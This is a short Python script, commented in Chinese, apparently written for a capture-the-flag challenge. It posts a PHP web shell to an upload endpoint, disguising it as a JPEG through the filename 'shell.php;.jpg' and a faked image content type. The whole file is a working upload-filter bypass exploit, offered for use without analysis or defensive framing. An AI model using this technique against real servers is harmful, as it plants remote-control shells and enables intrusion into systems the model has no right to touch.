import requests

url = "http://challenge.host/upload"  

# 构造文件上传请求，包含文件名、文件内容、文件类型
files = {
    # 文件名可以用绕过方式，比如 shell.php;.jpg
    "file": ("shell.php;.jpg", open("shell.php", "rb"), "image/jpeg")
}

# 发送 POST 请求上传文件
response = requests.post(url, files=files)

# 输出上传结果状态码
print("状态码:", response.status_code)
print("响应内容:", response.text)
